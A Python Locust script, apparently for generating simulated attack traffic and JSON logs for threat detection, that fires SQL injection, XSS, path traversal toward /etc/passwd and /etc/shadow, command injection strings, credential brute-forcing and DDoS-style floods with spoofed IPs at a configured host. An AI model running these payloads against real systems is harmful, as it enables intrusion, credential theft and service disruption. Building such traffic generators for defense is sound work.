import random
import json
import logging
import time
import uuid
import os
from locust import HttpUser, task, between, events
from locust.runners import MasterRunner
from locust.shape import LoadTestShape
from datetime import datetime
import gevent
import yaml
import urllib.parse
import secrets
import itertools
import string

config_path = "/mnt/locust/locust_config.yaml"
with open(config_path, "r") as config_file:
    config = yaml.safe_load(config_file)

logging_config_path = "/mnt/locust/logging_config.yaml"
with open(logging_config_path, 'rt') as f:
    logging_config = yaml.safe_load(f.read())
    logging.config.dictConfig(logging_config)

json_logger = logging.getLogger('json_logger')
user_stats_logger = logging.getLogger('threat_user_stats')


class UserManager:
    def __init__(self):
        self.users = {}
        self.user_classes = set()

    def add_user(self, user):
        self.users[user.user_id] = user
        self.user_classes.add(user.__class__)

    def remove_user(self, user):
        self.users.pop(user.user_id, None)

    def get_stats(self):
        stats = {cls: {'spawned': 0, 'active': 0} for cls in self.user_classes}
        for user in self.users.values():
            stats[user.__class__]['spawned'] += 1
            if user.is_active:
                stats[user.__class__]['active'] += 1
        return stats


user_manager = UserManager()


class DynamicMaliciousUser(HttpUser):
    wait_time = between(config['threat_users']['wait_time_min'], config['threat_users']['wait_time_max'])
    abstract = True
    host = config['host']
    instances = []

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.__class__.instances.append(self)
        self.is_active = False
        self.last_active_time = time.time()
        self.activation_cooldown = random.uniform(config['lifecycle']['min_cooldown'],
                                                  config['lifecycle']['max_cooldown'])
        self.randomuser()
        user_manager.add_user(self)

    def randomuser(self):
        self.user_id = str(uuid.uuid4())
        self.session_id = str(uuid.uuid4())
        self.client_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.user_agent = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'sqlmap/1.4.7#stable (http://sqlmap.org)',
            'Nikto/2.1.6',
            'Acunetix-WebVulnerability-Scanner/1.0',
        ])
        self.geolocation = random.choice([
            {"country": "Russia", "city": "Moscow", "timezone": "Europe/Moscow"},
            {"country": "China", "city": "Beijing", "timezone": "Asia/Shanghai"},
            {"country": "United States", "city": "Ashburn", "timezone": "America/New_York"},
            {"country": "Netherlands", "city": "Amsterdam", "timezone": "Europe/Amsterdam"},
        ])

    def get_headers(self):
        return {
            'X-Forwarded-For': self.client_ip,
            'User-Agent': self.user_agent
        }

    def on_start(self):
        self.is_active = True
        self.last_active_time = time.time()

    def on_stop(self):
        user_manager.remove_user(self)

    @staticmethod
    def load_payloads(filename):
        try:
            with open(f'/mnt/locust/payloads/{filename}', 'r') as file:
                return [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            logging.error(f"Payload file not found: {filename}")
            return []

    @task(2)
    def sql_injection_attempt(self):
        if not self.is_active:
            return
        payloads = self.load_payloads('SQL.txt')
        if not payloads:
            return
        payload = random.choice(payloads)
        self._log_request("GET", f"/products?id={payload}", None, "sql_injection")

    @task(2)
    def xss_attempt(self):
        if not self.is_active:
            return
        payload_files = ['stored_xss.txt', 'reflected_xss.txt', 'dom_xss.txt']
        selected_file = secrets.choice(payload_files)
        payloads = self.load_payloads(selected_file)
        if not payloads:
            return

        payload = secrets.choice(payloads)
        encoded_payload = urllib.parse.quote(payload)

        if selected_file == 'stored_xss.txt':
            data = {"comment": payload}
            self._log_request("POST", "/submit_comment", data, "xss_stored")
        elif selected_file == 'reflected_xss.txt':
            url = f"/search?q={encoded_payload}"
            self._log_request("GET", url, None, "xss_reflected")
        elif selected_file == 'dom_xss.txt':
            url = f"/page#payload={encoded_payload}"
            self._log_request("GET", url, None, "xss_dom")

    @task(2)
    def brute_force_login(self):
        if not self.is_active:
            return

        usernames = [
            'admin', 'root', 'user', 'test', 'guest', 'applebee', 'ofgirl', 'bigbuffmen', 
            'alphagamer101', 'donaldtrump', 'john', 'jane', 'doe', 'michael', 'sarah', 
            'jessica', 'james', 'brian', 'kim', 'chris', 'ashley', 'david', 'steve', 
            'paul', 'daniel', 'laura', 'kevin', 'robert', 'emily', 'anthony', 'joseph', 
            'matthew', 'joshua', 'elizabeth', 'michael123', 'nikki', 'nick', 'samantha', 
            'alex', 'taylor', 'madison', 'charlie', 'zoe', 'olivia', 'mia', 'harry', 
            'peter', 'lily', 'lucas', 'jackson', 'victor', 'emma', 'sofia'
        ]

        passwords = [
            'password', '123456', 'admin', 'qwerty', 'letmein', 'nonosquare', 
            '123456789', '12345678', '12345', '1234', '1234567', 'welcome', 
            'abc123', '111111', '123123', 'sunshine', 'iloveyou', 'admin123', 
            'football', 'monkey', 'letmein123', 'qwerty123', 'password1', 
            'password123', '1q2w3e4r', 'qazwsx', 'trustno1', 'dragon', 
            'pussy', 'baseball', 'master', 'hannah', 'lovers', 'qwertyuiop', 
            'welcome1', '123321', 'superman', 'jesus', 'abc', 'bunny', 
            'michael', 'letmein!', 'iloveu', 'happy', 'asdfghjkl', 
            '000000', 'qwerty!@#', '1qaz2wsx', '123qwe', 'asdf', 'myname', 
            'summer', 'secret', 'lovely', 'sunshine123', 'password!', 
            'qwerty1', 'iloveyou123', 'hannahmontana', 'hello', 'charlie', 
            'monkey123', 'princess', 'flower', 'abcd1234', 'abc123456', 
            'sweet', 'sarah', 'qwert', 'password1234', 'football123', 
            'friend', 'helpme', 'freedom', 'winner', 'goodlife', 'x123456', 
            'xpassword', 'fishing', 'tomorrow', 'nightmare', 'gorgeous'
        ]

        choice = random.randint(1, 3)
        if choice == 1:
            for username in usernames:
                for password in passwords:
                    self.randomuser()
                    self._log_request("POST", "/login", {"username": username, "password": password}, "brute_force")
                    time.sleep(random.uniform(1, 2))

        if choice == 2:
            characters = string.ascii_letters + string.digits + string.punctuation
            for length in range(7, 13):  # Password length from 7 to 12
                for password_tuple in itertools.product(characters, repeat=length):
                    password = ''.join(password_tuple)
                    for username in usernames:
                        self.randomuser()
                        self._log_request("POST", "/login", {"username": username, "password": password}, "brute_force")
                        time.sleep(random.uniform(1, 2))

    @task(1)
    def path_traversal_attempt(self):
        if not self.is_active:
            return
        choice = random.randint(1, 3)
        if choice == 1:
            retries = random.randint(1, 5)
            for _ in range(retries):
                self.randomuser()
                payloads = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/hosts",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                ]
                payload = random.choice(payloads)
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
        if choice == 2:
            retries = random.randint(1, 5)
            for _ in range(retries):
                self.randomuser()
                payloads = [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/hosts",
                    "../../../var/log/auth.log",  # Linux auth logs
                    "../../../var/www/html/config.php",  # PHP config files
                    "..\\..\\..\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat",  # Windows user data
                    "..\\..\\..\\Program Files\\Common Files\\system\\ole db\\msdasqlr.dll",  # Windows DLL
                    "../../../etc/shadow",  # Linux shadow file
                    "../../../opt/tomcat/conf/tomcat-users.xml"  # Tomcat configuration
                ]
                encoded_payloads = [
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",
                ]

                payload = random.choice(payloads + encoded_payloads)
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")
        if choice == 3:
            retries = random.randint(1, 5)
            for _ in range(retries):
                depth = random.randint(1, 6)
                traversal = "../" * depth
                file_target = random.choice([
                    "etc/passwd",
                    "etc/hosts",
                    "var/log/apache2/access.log",
                    "windows/win.ini"
                ])

                payload = f"{traversal}{file_target}"
                self._log_request("GET", f"/static/{payload}", None, "path_traversal")

    @task(1)
    def command_injection_attempt(self):
        if not self.is_active:
            return
        payloads = [
            "; cat /etc/passwd",
            "& ipconfig",
            "| ls -la",
            "`whoami`",
            "$(echo 'vulnerable')",
        ]
        payload = random.choice(payloads)
        self._log_request("GET", f"/exec?cmd=date{payload}", None, "command_injection")

    @task(2)
    def web_scraping(self):
        if not self.is_active:
            return
        randomuser = random.randint(1, 2)
        choice = random.randint(1, 3)
        if choice == 1:
            pages = ["/products", "/categories", "/reviews", "/comments", "/carts", "/information", "/aboutus"]
            for page in pages:
                self.randomuser()
                self._log_request("GET", page, None, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time
        elif choice == 2:
            search_terms = ["laptop", "phone", "book", "shirt", "headphones", "tablet", "watch", "camera", "shoes",
                            "jacket", "backpack", "sunglasses", "speaker", "smartwatch", "keyboard", "mouse", "charger",
                            "t-shirt", "monitor", "desk"]
            pages = ["/products", "/categories", "/reviews", "/comments", "/information"]
            for term in search_terms:
                page = random.choice(pages)
                if randomuser == 1:
                    self.randomuser()
                data = {"search_term": term}
                self._log_request("POST", page, data, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time
        elif choice == 3:
            pages = ["/products", "/categories", "/reviews", "/comments", "/carts", '/information', '/aboutus']
            for page in pages:
                self._log_request("GET", page, None, "web_scraping")
                time.sleep(random.uniform(1, 3))  # Simulate browsing time

    @task(2)
    def ddos_simulation(self):
        if not self.is_active:
            return
        randomuser = random.randint(1, 2)
        for _ in range(random.randint(5, 15)):
            # Randomize user_id, session_id, client_ip, and user_agent
            if randomuser == 1:
                self.randomuser()

            actions = [
                lambda: self._log_request("GET", "/", None, "ddos"),
                lambda: self._log_request("GET", f"/products/{random.randint(1, 20)}", None, "ddos"),  # Increased product range
                lambda: self._log_request("POST", "/cart", {"product_id": random.randint(1, 20), "quantity": random.randint(1, 5)}, "ddos"),  # Random quantity
                lambda: self._log_request("GET", "/cart", None, "ddos"),
                lambda: self._log_request("POST", "/checkout", {"payment_method": random.choice(["credit_card", "paypal", "bank_transfer"])}, "ddos"),  # Random payment method
                lambda: self._log_request("DELETE", "/cart", {"product_id": random.randint(1, 20)}, "ddos"),  # Simulate deleting an item
                lambda: self._log_request("PUT", "/update-cart", {"product_id": random.randint(1, 20), "quantity": random.randint(1, 5)}, "ddos")  # Update cart example
            ]

            for _ in range(random.randint(1, 20)):
                random.choice(actions)()

    def _log_request(self, method, path, data, threat_type):
        log_id = str(uuid.uuid4())
        start_time = time.time()
        headers = self.get_headers()
        try:
            if method == "GET":
                response = self.client.get(path, headers=headers)
            elif method == "POST":
                response = self.client.post(path, json=data, headers=headers)
            else:
                raise ValueError(f"Unsupported HTTP method: {method}")

            self._log_response(log_id, method, path, response, start_time, data, threat_type)
        except Exception as e:
            self._log_exception(log_id, method, path, e, start_time, data, threat_type)

    def _log_response(self, log_id, method, path, response, start_time, data, threat_type):
        log_entry = {
            "log_id": log_id,
            "threat_type": threat_type,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": response.status_code,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "bytes_sent": len(response.request.body) if response.request.body else 0,
            "bytes_received": len(response.content),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "request_headers": self.get_headers(),
            "response_headers": dict(response.headers),
            "geo": self.geolocation,
            "request_body": data if data else None,
        }
        json_logger.info(json.dumps(log_entry))

    def _log_exception(self, log_id, method, path, exception, start_time, data, threat_type):
        log_entry = {
            "log_id": log_id,
            "threat_type": threat_type,
            "@timestamp": datetime.utcnow().isoformat(),
            "client_ip": self.client_ip,
            "method": method,
            "url": f"{self.host}{path}",
            "status_code": 500,
            "response_time_ms": int((time.time() - start_time) * 1000),
            "exception": str(exception),
            "user_agent": self.user_agent,
            "referer": random.choice([None, "https://www.google.com", "https://www.bing.com", "https://example.com"]),
            "geo": self.geolocation,
            "request_body": data if data else None,
        }
        json_logger.info(json.dumps(log_entry))


enabled_user_classes = []

if config['threat_users'].get('sql_injection', {}).get('enabled', False):
    class SQLInjectionUser(DynamicMaliciousUser):
        weight = config['threat_users']['sql_injection'].get('weight', 1)
        tasks = [DynamicMaliciousUser.sql_injection_attempt]


    enabled_user_classes.append(SQLInjectionUser)

if config['threat_users'].get('xss', {}).get('enabled', False):
    class XSSUser(DynamicMaliciousUser):
        weight = config['threat_users']['xss'].get('weight', 1)
        tasks = [DynamicMaliciousUser.xss_attempt]


    enabled_user_classes.append(XSSUser)

if config['threat_users'].get('path_traversal', {}).get('enabled', False):
    class PathTraversalUser(DynamicMaliciousUser):
        weight = config['threat_users']['path_traversal'].get('weight', 1)
        tasks = [DynamicMaliciousUser.path_traversal_attempt]


    enabled_user_classes.append(PathTraversalUser)

if config['threat_users'].get('command_injection', {}).get('enabled', False):
    class CommandInjectionUser(DynamicMaliciousUser):
        weight = config['threat_users']['command_injection'].get('weight', 1)
        tasks = [DynamicMaliciousUser.command_injection_attempt]


    enabled_user_classes.append(CommandInjectionUser)

if config['threat_users'].get('brute_force', {}).get('enabled', False):
    class BruteForceUser(DynamicMaliciousUser):
        weight = config['threat_users']['brute_force'].get('weight', 1)
        tasks = [DynamicMaliciousUser.brute_force_login]


    enabled_user_classes.append(BruteForceUser)

if config['threat_users'].get('web_scraping', {}).get('enabled', False):
    class WebScrapingUser(DynamicMaliciousUser):
        weight = config['threat_users']['web_scraping'].get('weight', 1)
        tasks = [DynamicMaliciousUser.web_scraping]


    enabled_user_classes.append(WebScrapingUser)

if config['threat_users'].get('ddos', {}).get('enabled', False):
    class DDOSUser(DynamicMaliciousUser):
        weight = config['threat_users']['ddos'].get('weight', 1)
        tasks = [DynamicMaliciousUser.ddos_simulation]


    enabled_user_classes.append(DDOSUser)


def manage_user_lifecycle(environment):
    # I hate this code with a passion
    current_time = time.time()
    for user in list(user_manager.users.values()):
        if user.is_active:
            if random.random() < config['lifecycle']['deactivation_chance']:
                user.is_active = False
                user.last_active_time = current_time
                user.activation_cooldown = random.uniform(config['lifecycle']['min_cooldown'],
                                                          config['lifecycle']['max_cooldown'])
                logging.info(f"User {user.user_id} deactivated")
        elif current_time - user.last_active_time > user.activation_cooldown:
            if random.random() < config['lifecycle']['activation_chance']:
                user.is_active = True
                user.last_active_time = current_time
                logging.info(f"User {user.user_id} activated")


def log_user_stats():
    stats = user_manager.get_stats()
    log_message = "Threat User Statistics: " + ", ".join([
        f"{cls.__name__}: Spawned: {data['spawned']}, "
        f"Active: {data['active']}, "
        f"Inactive: {data['spawned'] - data['active']}"
        for cls, data in stats.items()
    ])
    user_stats_logger.info(log_message)


class CustomLoadShape(LoadTestShape):
    def __init__(self):
        super().__init__()
        self.user_count = config['threat_users'].get('count', int(os.getenv('THREAT_USERS', 2)))
        self.spawn_rate = config['threat_users'].get('spawn_rate', float(os.getenv('THREAT_SPAWN_RATE', 1)))
        self.user_classes = enabled_user_classes
        self.user_counts = self.calculate_user_counts()
        self.run_time = config.get('run_time', 3600)
        logging.info(f"CustomLoadShape initialized with user_count: {self.user_count}, spawn_rate: {self.spawn_rate}")
        logging.info(f"User distribution: {self.user_counts}")

    def calculate_user_counts(self):
        total_weight = sum(user_class.weight for user_class in self.user_classes)
        return {
            user_class: max(1, int(self.user_count * user_class.weight / total_weight))
            for user_class in self.user_classes
        }

    def tick(self):
        current_users = sum(len(user_class.instances) for user_class in self.user_classes)
        if current_users >= self.user_count:
            return self.user_count, self.spawn_rate

        return current_users + self.spawn_rate, self.spawn_rate


def periodic_tasks(environment):
    while True:
        manage_user_lifecycle(environment)
        log_user_stats()
        gevent.sleep(5)  # Log every 5 seconds


@events.init.add_listener
def on_locust_init(environment, **kwargs):
    if not isinstance(environment.runner, MasterRunner):
        logging.info(f"Initializing CustomLoadShape")
        environment.runner.shape_class = CustomLoadShape()
        gevent.spawn(periodic_tasks, environment)
